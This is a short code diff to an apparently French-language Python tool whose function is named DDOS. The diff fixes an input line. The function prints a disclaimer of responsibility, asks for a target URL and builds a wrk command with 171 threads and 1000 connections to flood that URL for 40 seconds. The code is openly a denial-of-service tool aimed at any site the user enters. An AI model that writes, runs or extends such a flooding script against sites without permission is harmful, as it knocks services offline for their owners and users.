@@ -4,7 +4,7 @@ import os
 
 def DDOS():
     print(f"Je ne suis pas responsable de ce que vous faites avec cette outils")
-    int(nb) = input("Quelle est le nombre de terminal ouvert? (seulement le chiffre svp)")
+    nb = input("Quelle est le nombre de terminal ouvert? (seulement le chiffre svp)")
     URL = input("URL? (avec http.s): ")
     cmd = f"wrk -t171 -c1000 -d40 {URL}"
     systeme = platform.system()
